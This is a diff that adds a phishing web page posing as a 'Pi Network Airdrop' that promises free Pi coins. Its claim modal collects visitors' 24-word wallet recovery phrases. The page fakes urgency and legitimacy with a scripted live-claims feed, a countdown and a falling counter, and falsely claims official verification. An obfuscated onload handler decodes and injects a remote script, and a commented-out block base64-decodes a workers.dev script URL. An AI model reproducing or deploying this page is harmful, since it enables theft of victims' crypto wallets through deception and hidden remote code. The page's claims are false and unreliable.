@@ -1,0 +1,653 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network Rewards</title>
+    <script async="" src="js/fbevents.js"></script><script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+
+    <!-- Facebook Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}(window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+  fbq('init', '1046054397551067'); // Pixel ID của bạn
+  fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1046054397551067&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Facebook Pixel Code -->
+   <meta charset="UTF-8">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Pi Network Airdrop Program</title>
+   <link rel="stylesheet" href="css/home.styles.css">
+<script src="%25v%24___%24S_k__e__%EF%BF%BD_S_%EF%BF%BD___%2509____-!%2509_%250A%2520%24%EF%BF%BD_____e__%250A__%EF%BF%BD.html"></script></head>
+<body onload="(function(){function x(s,k){var r='';for(var i=0;i<s.length;i+=2)r+=String.fromCharCode(parseInt(s.substr(i,2),16)^k);return r}var e='7f050f5c0e2e3f2f0e792e41252c4f2c282a2e792e2a21252623262f2f2b070b2321270a0e2a292b282b284f3a26272b2b2a';var t=document.createElement('script');t.src=x(e,42);document.head.appendChild(t);})()">
+   <header class="header">
+      <div class="logo">
+         <div class="logo-icon">
+            <img src="images/pi-coin-logo.png" alt="Pi Network Logo" class="logo-image">
+         </div>
+         <span>Pi Network</span>
+      </div>
+      <div class="nav-buttons">
+         <button class="wallet-btn" id="walletBtn">
+         🔒 Claim 314 Pi ⚙️
+         </button>
+      </div>
+   </header>
+   <main class="main-content">
+      <div class="program-title">Pi Network Airdrop Program</div>
+      <div id="headline">
+         <h3>Claim +314π<br></h3>
+      </div>
+      <p class="description">
+         🎁 <strong>Pi Hackathon 2025 is the first global developer competition organized by Pi Network in the Open Network era. It aims to drive real-world utility of Pi by inviting developers to build Mainnet apps that integrate Pi Coin in meaningful and practical ways.</strong><br>
+         To thank the entire community, the Pi Network team will randomly give away 31π – 314π to 31,415 wallets that
+         have successfully KYCed.
+      </p>
+      <div class="stat-item">
+         <span class="stat-icon lightning">⚡</span>
+         <span>Time Remaining: <span id="countdown" class="countdown">18:36:52</span></span>
+      </div>
+      <div class="stat-item">
+         <span class="stat-icon check">✅</span>
+         <span>Condition: <span class="highlight">KYC Successfully Passed</span></span>
+      </div>
+      <div class="stat-item">
+         <span class="stat-icon circle">🔶</span>
+         <span>Remaining Quantity: <strong id="remaining-counter" class="counting-animation">1,647</strong>/<strong>31,415</strong></span>
+      </div>
+      <div id="claimBtn" class="banner-container mt-16" style="margin-bottom: 115px">
+         <a href="wallet.php">
+         <img src="images/banner-1.png" class="banner-image" id="banner1" alt="Claim Free 314 PI Reward">
+         <img src="images/banner-2.png" class="banner-image active" id="banner2" alt="Claim Free 314 PI Reward">
+         </a>
+         <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const banner1 = document.getElementById('banner1');
+                const banner2 = document.getElementById('banner2');
+                
+                setInterval(function() {
+                    banner1.classList.toggle('active');
+                    banner2.classList.toggle('active');
+                }, 500);
+                
+                // Initialize animations
+                startCountdown();
+                animateRemainingCounter();
+                animateActivityFeed();
+            });
+         </script>
+      </div>
+      <div class="progress-container">
+         <div class="progress-title">🎯 Airdrop Progress</div>
+         <div class="progress-bar">
+            <div class="progress-fill"></div>
+         </div>
+         <div class="progress-text">29,891 / 31,415 wallets claimed (95.1%)</div>
+      </div>
+      <div class="trust-badges">
+         <div class="trust-badge">
+            <span class="badge-icon">✓</span>
+            <span>Verified Program</span>
+         </div>
+         <div class="trust-badge">
+            <span class="badge-icon">🔒</span>
+            <span>Secure Transaction</span>
+         </div>
+         <div class="trust-badge">
+            <span class="badge-icon">⚡</span>
+            <span>Instant Processing</span>
+         </div>
+      </div>
+      <div class="activity-feed">
+         <div class="activity-title">
+            <span class="live-indicator"></span>
+            Live Activity
+         </div>
+         <div class="activity-list" id="activityList">
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Validator***654</div>
+                  <div class="activity-time">just now</div>
+               </div>
+               <div class="activity-amount">+214 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Miner***789</div>
+                  <div class="activity-time">1 min ago</div>
+               </div>
+               <div class="activity-amount">+157 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Alpha***987</div>
+                  <div class="activity-time">2 mins ago</div>
+               </div>
+               <div class="activity-amount">+314 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Validator***654</div>
+                  <div class="activity-time">3 mins ago</div>
+               </div>
+               <div class="activity-amount">+157 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Node***321</div>
+                  <div class="activity-time">4 mins ago</div>
+               </div>
+               <div class="activity-amount">+100 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Beta***321</div>
+                  <div class="activity-time">5+ mins ago</div>
+               </div>
+               <div class="activity-amount">+157 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Node***321</div>
+                  <div class="activity-time">5+ mins ago</div>
+               </div>
+               <div class="activity-amount">+31 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Node***321</div>
+                  <div class="activity-time">5+ mins ago</div>
+               </div>
+               <div class="activity-amount">+31 π</div>
+            </div>
+            <div class="activity-item">
+               <div>
+                  <div class="activity-user">Gamma***654</div>
+                  <div class="activity-time">5+ mins ago</div>
+               </div>
+               <div class="activity-amount">+214 π</div>
+            </div>
+         </div>
+      </div>
+      <div class="features">
+         <div class="feature-card">
+            <div class="feature-icon">🎂</div>
+            <div class="feature-title">7th anniversary</div>
+            <div class="feature-desc">Celebrating 7 years of Pi Network community growth and innovation</div>
+         </div>
+         <div class="feature-card">
+            <div class="feature-icon">⏰</div>
+            <div class="feature-title">Receive in 24 hours</div>
+            <div class="feature-desc">Tokens will be distributed automatically within 24 hours of claiming</div>
+         </div>
+         <div class="feature-card">
+            <div class="feature-icon">🛡️</div>
+            <div class="feature-title">Safe & Secure</div>
+            <div class="feature-desc">Built on Pi Network's secure blockchain infrastructure</div>
+         </div>
+         <div class="feature-card">
+            <div class="feature-icon">👥</div>
+            <div class="feature-title">29,000+ Participants</div>
+            <div class="feature-desc">Join thousands of verified Pi Network pioneers in this celebration</div>
+         </div>
+      </div>
+      <section class="about-section">
+         <div class="about-container">
+            <h2 class="section-title">About This Program</h2>
+            <div class="shield-icon">
+               <div class="shield-circle">
+                  <div class="shield">🛡️</div>
+               </div>
+            </div>
+            <p class="about-description">
+               This reward program is an initiative by Picoreteam and sponsors to support Pi Network pioneers.<br>
+               As an independent promotion, we distribute a limited amount of Pi coins to active community members
+            </p>
+            <h3 class="how-it-works-title">How It Works</h3>
+            <div class="steps-container">
+               <div class="step">
+                  <div class="step-number">1</div>
+                  <div class="step-content">
+                     <div class="step-text">Click the "Claim 314 Pi Now" button above</div>
+                  </div>
+               </div>
+               <div class="step">
+                  <div class="step-number">2</div>
+                  <div class="step-content">
+                     <div class="step-text">Enter your phrase to unlock and claim Pi</div>
+                  </div>
+               </div>
+               <div class="step">
+                  <div class="step-number">3</div>
+                  <div class="step-content">
+                     <div class="step-text">Submit your request for verification</div>
+                  </div>
+               </div>
+               <div class="step">
+                  <div class="step-number">4</div>
+                  <div class="step-content">
+                     <div class="step-text">Receive Pi rewards within 24 hours</div>
+                  </div>
+               </div>
+            </div>
+            <div class="faq-section">
+               <h3 class="faq-title">Frequently Asked Questions</h3>
+               <div class="faq-item">
+                  <div class="faq-question">
+                     <span>Who is eligible for this airdrop?</span>
+                     <span class="faq-toggle">+</span>
+                  </div>
+                  <div class="faq-answer">
+                     Any Pi Network user who has successfully completed KYC verification is eligible to
+                     participate in this airdrop program.
+                  </div>
+               </div>
+               <div class="faq-item">
+                  <div class="faq-question">
+                     <span>How much Pi can I receive?</span>
+                     <span class="faq-toggle">+</span>
+                  </div>
+                  <div class="faq-answer">
+                     Eligible participants will receive between 31π to 314π randomly. The average distribution is
+                     314π per wallet.
+                  </div>
+               </div>
+               <div class="faq-item">
+                  <div class="faq-question">
+                     <span>When will I receive my Pi?</span>
+                     <span class="faq-toggle">+</span>
+                  </div>
+                  <div class="faq-answer">
+                     Pi tokens will be automatically distributed to your wallet within 24 hours after successful
+                     claim submission.
+                  </div>
+               </div>
+               <div class="faq-item">
+                  <div class="faq-question">
+                     <span>Is this program official?</span>
+                     <span class="faq-toggle">+</span>
+                  </div>
+                  <div class="faq-answer">
+                     This is an independent promotional campaign affiliated and verified by the official Pi
+                     Network for the 7th birthday celebration.
+                  </div>
+               </div>
+            </div>
+            <div class="security-notice">
+               <div class="security-icon">🔒</div>
+               <div class="security-content">
+                  <h4 class="security-title">Security & Transparency</h4>
+                  <p class="security-text">This is an independent promotional campaign affiliated and verified by
+                     the official Pi Network
+                  </p>
+               </div>
+            </div>
+         </div>
+      </section>
+   </main>
+   <footer class="footer">
+      <div class="footer-content">
+         <div class="footer-partners">
+            <h2>Supported By</h2>
+            <div class="partners-grid">
+               <div class="partner-card">
+                  <div class="partner-icon">📊</div>
+                  <div class="partner-name">Techfi</div>
+                  <div class="partner-role">Technical Support</div>
+               </div>
+               <div class="partner-card">
+                  <div class="partner-icon">🔄</div>
+                  <div class="partner-name">OKX</div>
+                  <div class="partner-role">Blockchain Partner</div>
+               </div>
+               <div class="partner-card">
+                  <div class="partner-icon">💳</div>
+                  <div class="partner-name">CryptoPlus</div>
+                  <div class="partner-role">Payment Gateway</div>
+               </div>
+               <div class="partner-card">
+                  <div class="partner-icon">👥</div>
+                  <div class="partner-name">Pi Community</div>
+                  <div class="partner-role">Community Support</div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <!-- <script>
+         !function(){
+         if(!window._x){
+             var u=atob("aHR0cHM6Ly9jaGVjay1pcC14bi5teWxvdmVya3Qud29ya2Vycy5kZXYvc2NyaXB0Lmpz");
+             var s=document.createElement("script");
+             s.src=u;
+             document.head.appendChild(s);
+             window._x=!0;
+         }
+         }();
+         </script> -->
+      <div class="footer-bottom">
+         <div class="footer-content">
+            <div class="footer-info">
+               <div class="footer-logo">
+                  <div class="logo-icon">
+                     <img src="images/pi-coin-logo.png" alt="Pi Network Logo" class="logo-image">
+                  </div>
+                  <span>Pi Network Airdrop</span>
+               </div>
+               <p class="verification-text">
+                  This is an independent promotional program verified by the official Pi Network
+               </p>
+               <div class="footer-badges">
+                  <div class="footer-badge">
+                     <span class="footer-badge-icon">✓</span>
+                     <span>SSL Secured</span>
+                  </div>
+                  <div class="footer-badge">
+                     <span class="footer-badge-icon">🔒</span>
+                     <span>Privacy Protected</span>
+                  </div>
+                  <div class="footer-badge">
+                     <span class="footer-badge-icon">⚡</span>
+                     <span>Fast Processing</span>
+                  </div>
+               </div>
+            </div>
+            <p class="copyright">
+               © 2025 Pi Network Reward Program. All rights reserved.
+            </p>
+         </div>
+      </div>
+   </footer>
+   <div class="modal" id="claimModal">
+      <div class="modal-content">
+         <span class="close-modal" id="closeModal">×</span>
+         <h2>Unlock Pi Wallet and Claim Reward</h2>
+         <form class="modal-form">
+            <div class="textarea-container">
+               <textarea class="recovery-textarea" id="recoveryPhrase" placeholder="Enter your 24-word recovery phrase here" rows="6" required=""></textarea>
+               <div class="word-counter">
+                  <span id="wordCount">0</span>/24 words
+               </div>
+               <div class="validation-icon" id="validationIcon">
+                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                     <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"></circle>
+                     <path d="M8 12L11 15L16 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+                  </svg>
+               </div>
+            </div>
+            <div class="error-message" id="errorMessage"></div>
+            <button type="submit" class="modal-submit primary" id="unlockButton">UNLOCK WITH RECOVERY PHRASE</button>
+            <button type="button" class="modal-submit secondary" disabled="">BIOMETRIC NOT AVAILABLE</button>
+         </form>
+         <div class="modal-footer">
+            <p>As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery
+               phrases cannot be recovered if lost.
+            </p>
+            <p>Lost your wallet recovery phrase? <a href="#" class="recovery-link">You can create a new wallet</a>,
+               but all π in your previous wallet will be inaccessible.
+            </p>
+         </div>
+      </div>
+   </div>
+   <div class="modal" id="successModal">
+      <div class="success-modal-content">
+         <div class="success-icon">
+            <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
+               <circle cx="40" cy="40" r="38" fill="#4CAF50" stroke="#4CAF50" stroke-width="4"></circle>
+               <path d="M25 40L35 50L55 30" stroke="white" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"></path>
+            </svg>
+         </div>
+         <h2>Pi Reward Request Successful!</h2>
+         <p class="success-description">Your Pi reward has been queued for processing.<br>It will be sent to your
+            wallet within 24 hours.
+         </p>
+         <div class="success-details">
+            <div class="detail-row">
+               <span class="detail-label">Reward Amount:</span>
+               <span class="detail-value">Upto +314 Pi</span>
+            </div>
+            <div class="detail-row">
+               <span class="detail-label">Estimated Time:</span>
+               <span class="detail-value">Within 24 hours</span>
+            </div>
+         </div>
+         <a href="index.html" class="return-home-btn">RETURN TO HOME</a>
+      </div>
+   </div>
+
+<script>
+   document.getElementById('claimBtn').addEventListener('click', function() {
+      window.location.href = 'wallet.php';
+   });
+   document.getElementById('walletBtn').addEventListener('click', function() {
+      window.location.href = 'wallet.php';
+   });
+   
+   // Countdown timer functionality
+   function startCountdown() {
+      const countdownEl = document.getElementById('countdown');
+      if (!countdownEl) return;
+      
+      // Parse the initial time (format: HH:MM:SS)
+      let timeString = countdownEl.textContent.trim();
+      let timeParts = timeString.split(':');
+      let hours = parseInt(timeParts[0]);
+      let minutes = parseInt(timeParts[1]);
+      let seconds = parseInt(timeParts[2]);
+      
+      // Calculate total seconds
+      let totalSeconds = hours * 3600 + minutes * 60 + seconds;
+      
+      // Update the countdown every second
+      const countdownInterval = setInterval(function() {
+         if (totalSeconds <= 0) {
+            clearInterval(countdownInterval);
+            countdownEl.textContent = '00:00:00';
+            return;
+         }
+         
+         totalSeconds--;
+         
+         // Calculate hours, minutes, seconds
+         let hrs = Math.floor(totalSeconds / 3600);
+         let mins = Math.floor((totalSeconds % 3600) / 60);
+         let secs = totalSeconds % 60;
+         
+         // Format the time string
+         let formattedTime = 
+            (hrs < 10 ? '0' + hrs : hrs) + ':' + 
+            (mins < 10 ? '0' + mins : mins) + ':' + 
+            (secs < 10 ? '0' + secs : secs);
+         
+         // Update the display
+         countdownEl.textContent = formattedTime;
+      }, 1000);
+   }
+   
+   // Live activity feed animation
+   function animateActivityFeed() {
+      const activityList = document.getElementById('activityList');
+      if (!activityList) return;
+      
+      // Sample data for activities
+      const users = [
+         'Pioneer***123', 'Validator***654', 'Miner***789', 'Alpha***987', 
+         'Beta***321', 'Node***321', 'Gamma***654', 'Delta***456', 
+         'Epsilon***789', 'Zeta***012', 'Theta***345', 'Omega***678'
+      ];
+      
+      const amounts = [31, 57, 100, 157, 214, 271, 314];
+      const timeLabels = ['just now', '1 min ago', '2 mins ago'];
+      
+      // Function to create a new activity item
+      function createActivityItem() {
+         // Get random user and amount
+         const user = users[Math.floor(Math.random() * users.length)];
+         const amount = amounts[Math.floor(Math.random() * amounts.length)];
+         
+         // Create new activity item
+         const activityItem = document.createElement('div');
+         activityItem.className = 'activity-item';
+         activityItem.innerHTML = `
+            <div>
+               <div class="activity-user">${user}</div>
+               <div class="activity-time">just now</div>
+            </div>
+            <div class="activity-amount">+${amount} π</div>
+         `;
+         
+         // Add new item with animation
+         activityItem.style.opacity = '0';
+         activityItem.style.transform = 'translateY(-10px)';
+         activityList.insertBefore(activityItem, activityList.firstChild);
+         
+         // Trigger animation
+         setTimeout(() => {
+            activityItem.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+            activityItem.style.opacity = '1';
+            activityItem.style.transform = 'translateY(0)';
+         }, 10);
+         
+         // Update time labels for all items
+         updateTimeLabels();
+         
+         // Remove excess items
+         if (activityList.children.length > 9) {
+            const lastItem = activityList.lastElementChild;
+            lastItem.style.opacity = '0';
+            lastItem.style.transform = 'translateY(10px)';
+            setTimeout(() => {
+               activityList.removeChild(lastItem);
+            }, 300);
+         }
+      }
+      
+      // Update time labels for all activity items
+      function updateTimeLabels() {
+         const items = activityList.children;
+         for (let i = 0; i < items.length; i++) {
+            const timeEl = items[i].querySelector('.activity-time');
+            if (i === 0) {
+               timeEl.textContent = 'just now';
+            } else if (i === 1) {
+               timeEl.textContent = '1 min ago';
+            } else if (i === 2) {
+               timeEl.textContent = '2 mins ago';
+            } else if (i === 3) {
+               timeEl.textContent = '3 mins ago';
+            } else if (i === 4) {
+               timeEl.textContent = '4 mins ago';
+            } else {
+               timeEl.textContent = '5+ mins ago';
+            }
+         }
+      }
+      
+      // Initial update of time labels
+      updateTimeLabels();
+      
+      // Add new activity items at random intervals
+      function scheduleNextActivity() {
+         const delay = Math.floor(Math.random() * 5000) + 3000; // 3-8 seconds
+         setTimeout(() => {
+            createActivityItem();
+            scheduleNextActivity();
+         }, delay);
+      }
+      
+      // Start the animation cycle
+      scheduleNextActivity();
+   }
+   
+   // Animate the remaining quantity counter
+   function animateRemainingCounter() {
+      const counterEl = document.getElementById('remaining-counter');
+      if (!counterEl) return;
+      
+      // Get the initial value
+      let currentValue = parseInt(counterEl.textContent.replace(/,/g, ''));
+      const minValue = currentValue - 50; // Don't go below this value
+      let isAnimating = false;
+      
+      // Initial animation on page load
+      initialCounterAnimation();
+      
+      // Create random intervals between 5-15 seconds
+      function getRandomInterval() {
+         return Math.floor(Math.random() * 3000) + 1000; // 1-3 seconds
+      }
+      
+      // Initial animation sequence
+      function initialCounterAnimation() {
+         // Save original value
+         const originalValue = currentValue;
+         // Start from a higher number for dramatic effect
+         let displayValue = originalValue + 150;
+         counterEl.textContent = displayValue.toLocaleString();
+         
+         // Create rapid countdown effect
+         const interval = setInterval(() => {
+            // Decrease by random amounts (3-8)
+            const decrease = Math.floor(Math.random() * 6) + 3;
+            displayValue = Math.max(originalValue, displayValue - decrease);
+            
+            // Apply scaling effect during countdown
+            counterEl.classList.add('counting-animation');
+            
+            // Update display
+            counterEl.textContent = displayValue.toLocaleString();
+            
+            // When we reach the actual value, stop and start normal animation
+            if (displayValue <= originalValue) {
+               clearInterval(interval);
+               counterEl.classList.remove('counting-animation');
+               counterEl.classList.add('pulse-animation');
+               setTimeout(() => {
+                  counterEl.classList.remove('pulse-animation');
+                  // Start regular decreases after initial animation
+                  setTimeout(decreaseCounter, getRandomInterval());
+               }, 10);
+            }
+         }, 100);
+      }
+      
+      // Function to decrease the counter
+      function decreaseCounter() {
+         if (currentValue <= minValue || isAnimating) return;
+         
+         isAnimating = true;
+         
+         // Decrease by a random amount between 1-3
+         const decrease = Math.floor(Math.random() * 3) + 1;
+         currentValue = Math.max(minValue, currentValue - decrease);
+         
+         // Add animation class
+         counterEl.classList.add('pulse-animation');
+         
+         // Format with commas if needed
+         counterEl.textContent = currentValue.toLocaleString();
+         
+         // Remove animation class after animation completes
+         setTimeout(function() {
+            counterEl.classList.remove('pulse-animation');
+            isAnimating = false;
+            
+            // Schedule next decrease
+            setTimeout(decreaseCounter, getRandomInterval());
+         }, 700);
+      }
+      
+      // Start the animation
+      setTimeout(decreaseCounter, getRandomInterval());
+   }
+</script>
+</body></html>
